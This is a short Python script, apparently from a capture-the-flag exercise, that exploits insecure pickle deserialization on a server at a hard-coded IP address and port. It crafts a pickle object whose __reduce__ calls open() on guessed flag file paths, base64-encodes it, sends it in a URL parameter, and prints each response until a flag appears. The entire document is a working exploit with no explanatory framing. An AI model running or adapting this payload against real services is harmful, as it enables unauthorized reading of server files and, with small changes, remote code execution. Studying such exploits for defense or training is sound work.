import pickle
import base64
import requests

# Define a list of possible flag file paths
file_paths = [
    "/flag.txt",
    "/app/flag.txt",
    "/tmp/flag.txt",
    "/flag-*.txt",
    "/flag-[random_generated].txt",  # Adjust for specific filename if known
]

# Base URL of the target server
url = "http://3.142.89.90:31010/?s="

# Define the exploit class to attempt opening each file path
class Exploit:
    def __init__(self, path):
        self.path = path

    def __reduce__(self):
        # Attempt to open the file at the given path
        return (open, (self.path, 'r'))

for path in file_paths:
    try:
        print(f"Trying path: {path}")

        # Serialize the payload with the current path
        payload = pickle.dumps(Exploit(path))
        
        # Encode in base64 for transmission
        b64_payload = base64.b64encode(payload).decode()

        # Send the payload to the server
        response = requests.get(url + b64_payload)

        # Check if the response contains the flag
        print(f"Response for path {path}:")
        print(response.status_code)
        print(response.text)
        
        # Break if we find a response that likely contains the flag
        if "flag{" in response.text:
            print("Flag found!")
            break
    except Exception as e:
        print(f"Error with path {path}: {e}")
